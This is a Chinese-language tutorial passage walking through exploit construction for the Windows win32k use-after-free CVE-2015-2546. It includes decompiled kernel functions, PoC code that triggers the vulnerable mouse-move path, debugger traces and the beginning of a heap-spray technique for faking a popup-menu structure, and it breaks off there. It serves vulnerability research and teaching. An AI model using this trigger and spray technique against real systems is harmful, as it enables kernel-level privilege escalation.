# 0x00：前言
本片文章从百度安全实验室的分析文章入手构造Windows 7 x86
sp1下的Exploit，参考文章的链接在文末，CVE-2015-2546这个漏洞和CVE-2014-4113很类似，原理都是Use After
Free，利用的点也都是差不多的，建议先从CVE-2014-4113开始分析，再到CVE-2015-2546这个漏洞，不过问题不大，我尽量写的详细一些
# 0x01：漏洞原理
借鉴补丁分析文章中的一张图片，左边是打了补丁之后的状况，我们很清楚的可以看到，这里多了一个对`[eax+0B0h]`的检测，而这里的eax则是`tagWND`，`[eax+0B0h]`也就是`tagMENUWND->
pPopupMenu`结构，漏洞的原因就是这个结构的Use After Free，文章还提出了缺陷函数则是 xxxMNMouseMove
漏洞的触发流程则是，首先我们需要进入到 xxxMNMouseMove 函数，函数中会有一个 xxxSendMessage
函数发送用户模式的回调，然而我们可以通过回调函数进行捕获，将传入的窗口进行销毁并且占用，因为没有相应的检查，后面会将占用的 pPopupMenu 结构传入
xxxMNHideNextHierarchy
函数，此函数会对`tagPOPUPMENU.spwndNextPopup`发送消息，我们只需要构造好发送的消息即可内核任意代码执行
# 0x02：漏洞利用
## 抵达xxxMNMouseMove
众所周知，我们利用漏洞的第一步是抵达漏洞点，如果你调过CVE-2014-4113的话，你会发现他们的漏洞点很接近，都在
xxxHandleMenuMessages 函数中，所以我们完全可以在4113的基础上进行构造，4113的Poc参考 =>
[这里](https://github.com/ThunderJie/CVE/blob/master/CVE-2014-4113/Poc.c)
，然而当我看到这张图的时候我内心是很崩溃的
我们先来看看这个函数的大概情况，这里我对函数进行了压缩，我们是想要进入 xxxMNMouseMove 函数，然而在
xxxHandleMenuMessages 这个函数中无时无刻都体现出了 v5 这个东西的霸气，而这个 v5 则来自我们的第一个参数
a1，也就是说我们只要把这东西搞清楚，能够实现对它的控制，我们也就能执行到我们的目的地了
    int __stdcall xxxHandleMenuMessages(int a1, int a2, WCHAR UnicodeString)
    {
      v5 = *(_DWORD *)(a1 + 4);
      if ( v5 > 0x104 )
      {
        if ( v5 > 0x202 )
        {
          if ( v5 == 0x203 )
          {
          }
          if ( v5 == 0x204 )
          {
          }
          if ( v5 != 0x205 )
          {
            if ( v5 == 0x206 )
          }
        }
        if ( v5 == 0x202 )
        v20 = v5 - 0x105; // 0x105
        if ( v20 )
        {
          v21 = v20 - 1; // 0x105 + 1
          if ( v21 )
          {
            v22 = v21 - 0x12; // 0x105 + 1 + 0x12
            if ( !v22 )
              return 1;
            v23 = v22 - 0xE8; // 0x105 + 1 + 0x12 + 0xE8
            if ( v23 )
            {
              if ( v23 == 1 ) // 0x105 + 1 + 0x12 + 0xE8 + 0x1 = 0x201
              {
                  // CVE-2014-4113
              }
              return 0;
            }
            xxxMNMouseMove((WCHAR)v3, a2, (int)v7); // Destination
      }
我们在4113的Poc中可以发现我们main窗口的回调函数中构造如下，这里当窗口状态为空闲`WM_ENTERIDLE`的时候，我们就用`PostMessageA`函数模拟单击事件，从而抵达漏洞点，发送的第三个消息我们的第二个参数为`WM_LBUTTONDOWN`也就是0x201，也就是说这里是通过我们传入的第二个参数来判断的，因为我们传入的是
0x201 所以抵达了4113的利用点
    LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
        /*
        Wait until the window is idle and then send the messages needed to 'click' on the submenu to trigger the bug
        */
        printf("[+] WindProc called with message=%d\n", msg);
        if (msg == WM_ENTERIDLE) {
            PostMessageA(hwnd, WM_KEYDOWN, VK_DOWN, 0);
            PostMessageA(hwnd, WM_KEYDOWN, VK_RIGHT, 0);
            PostMessageA(hwnd, WM_LBUTTONDOWN, 0, 0);
        }
        //Just pass any other messages to the default window procedure
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
所以我们这里将其改为 0x200 再次观察，注意这里我们都是用宏代替的数字，再次运行即可抵达漏洞点
    LRESULT CALLBACK MyWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
    {
        if (uMsg == WM_ENTERIDLE)
        {
            if (gFlag1 != 1)
            {
                gFlag1 = 1;
                PostMessageA(hWnd, WM_KEYDOWN, VK_DOWN, 0);
                PostMessageA(hWnd, WM_KEYDOWN, VK_RIGHT, 0);
                PostMessageA(hWnd, WM_MOUSEMOVE, 0, 0);
            }
            else
            {
                PostMessageA(hWnd, WM_CLOSE, 0, 0);
            }
        }
        return DefWindowProcA(hWnd, uMsg, wParam, lParam);
    }
进入了函数之后就要进一步运行到 xxxMNHideNextHierarchy 处，也就是下图标注的地方，总而言之，我们就是通过可控的参数不断修改函数流程
我们运行刚才修改的Poc，发现运行到一半跳走了
    0: kd> 
    win32k!xxxMNMouseMove+0x2c:
    95e3941b 3b570c          cmp     edx,dword ptr [edi+0Ch]
    0: kd> 
    win32k!xxxMNMouseMove+0x2f:
    95e3941e 0f846f010000    je      win32k!xxxMNMouseMove+0x1a4 (95e39593)
    0: kd> 
    win32k!xxxMNMouseMove+0x1a4: // 这里跳走了
    95e39593 5f              pop     edi
    0: kd> 
    win32k!xxxMNMouseMove+0x1a5:
    95e39594 5b              pop     ebx
    0: kd> 
    win32k!xxxMNMouseMove+0x1a6:
    95e39595 c9              leave
    0: kd> 
    win32k!xxxMNMouseMove+0x1a7:
    95e39596 c20c00          ret     0Ch
我们查看一下寄存器情况，这里是两个0在比较，所以跳走了
    2: kd> r
    eax=00000000 ebx=fe951380 ecx=00000000 edx=00000000 esi=95f1f580 edi=95f1f580
    eip=95e3941b esp=8c64fa6c ebp=8c64fa90 iopl=0         nv up ei pl zr na pe nc
    cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246
    win32k!xxxMNMouseMove+0x2c:
    95e3941b 3b570c          cmp     edx,dword ptr [edi+0Ch] ds:0023:95f1f58c=00000000
    2: kd> dd edi+0Ch l1
    95f1f58c  00000000
    2: kd> r edx
    edx=00000000
我们看看这个edi是如何得到的，你可以在调用函数之前下断点观察，下面是我的调试过程，这里我直接说结果了，这个 edi+0Ch 其实就是我们
PostMessageA 传入的第四个参数
    2: kd> g
    Breakpoint 0 hit
    win32k!xxxHandleMenuMessages+0x2e8:
    95e39061 e889030000      call    win32k!xxxMNMouseMove (95e393ef)
    3: kd> dd esp l4
    8c6dda98  fde9f2c8 95f1f580 00000000
    3: kd> 
    win32k!xxxMNMouseMove+0x2c:
    95e3941b 3b570c          cmp     edx,dword ptr [edi+0Ch]
    3: kd> r
    eax=00000000 ebx=fde9f2c8 ecx=00000000 edx=00000000 esi=95f1f580 edi=95f1f580
    eip=95e3941b esp=8c6dda6c ebp=8c6dda90 iopl=0         nv up ei pl zr na pe nc
    cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246
    win32k!xxxMNMouseMove+0x2c:
    95e3941b 3b570c          cmp     edx,dword ptr [edi+0Ch] ds:0023:95f1f58c=00000000
所以我们只需要把第四个参数改为1就行了
    PostMessageA(hWnd, WM_MOUSEMOVE, 0, 1);
## xxxMNMouseMove函数分析
我们来分析一下这个函数的具体情况，不必要的地方我进行了删减，可以看出这个 v7 是很重要的，v7即是 xxxMNFindWindowFromPoint
函数的返回值，为了到达漏洞点我们需要进一步的构造，这里对 v7 的返回值进行了判断，我们不能让其为 -5 ，也不能让其为 -1 ，也不能让其为 0
，所以我们需要考虑一下该如何实现这个过程
    void __stdcall xxxMNMouseMove(WCHAR UnicodeString, int a2, int a3)
    {
      ...
      v3 = (HDC)UnicodeString;
      if ( v3 == *((HDC *)v3 + 8) )
      {
        if ( (signed __int16)a3 != *(_DWORD *)(a2 + 8) || SHIWORD(a3) != *(_DWORD *)(a2 + 0xC) )
        {
          v6 = xxxMNFindWindowFromPoint((WCHAR)v3, (int)&UnicodeString, v4);// 通过 Hook 可控
          v7 = v6;
          ...
          if ( v7 == 0xFFFFFFFB )                   // v7 == -5
          {
            ...
          }
          else
          {
            if ( v7 == 0xFFFFFFFF ) // v7 == -1
              goto LABEL_15;
            if ( v7 )
            {
              if ( IsWindowBeingDestroyed(v7) )
                return;
              ...
              tagPOPUPMENU = *(_DWORD **)(v7 + 0xB0);// 获取 tagPOPUPMENU,偏移为 +0B0h
              if ( v8 & 0x100 && !(v8 & 0x8000) && !(*tagPOPUPMENU & 0x100000) )
              {
                ...
                xxxSendMessage((PVOID)v7, 0x20, *(_DWORD *)v7, (void *)2);
              }
              v10 = xxxSendMessage((PVOID)v7, 0xE5, UnicodeString, 0); // 处理 1E5h
              if ( v10 & 0x10 && !(v10 & 3) && !xxxSendMessage((PVOID)v7, 0xF0, 0, 0) ) // 处理 1F0h
                xxxMNHideNextHierarchy(tagPOPUPMENU);// 触发漏洞
              goto LABEL_30;
            }
          }
        }
      }
    }
从上面的代码可以看出，这里要调用三次 xxxSendMessage 函数，也就是说我们需要在回调函数中处理三种消息即可，第一处和4113一样，我们处理
1EB 的消息，但是你会发现我们一直卡在了这里
    if ( IsWindowBeingDestroyed(v7) )
        return;
这个函数的原型如下，作用是确定给定的窗口句柄是否标识一个已存在的窗口，也就是说我们的v7必须是要返回一个窗口句柄，这里我们考虑返回一个窗口句柄即可
    // Determines whether the specified window handle identifies an existing window.
    BOOL IsWindow(
      HWND hWnd
    );
## 构造Fake Structure
到达了利用点我们需要考虑如何对结构体进行构造，这里我们使用的是`CreateAcceleratorTable`函数进行堆喷，这个函数的作用就是用来创建加速键表，因为每创建的一个加速键表大小为0x8，我们的`tagPOPUPMENU`大小为0x28也就刚好是5个加速键表，所以我们可以通过控制加速键表的池布局来实现构造假的`tagPOPUPMENU`
    LPACCEL lpAccel = (LPACCEL)LocalAlloc(
            LPTR, 
            sizeof(ACCEL) * 0x5 // 大小 0x8 * 0x5 = 0x28 与 tagPOPUPMENU 大小相同
    );
    // 创建很多加速键表,实现堆喷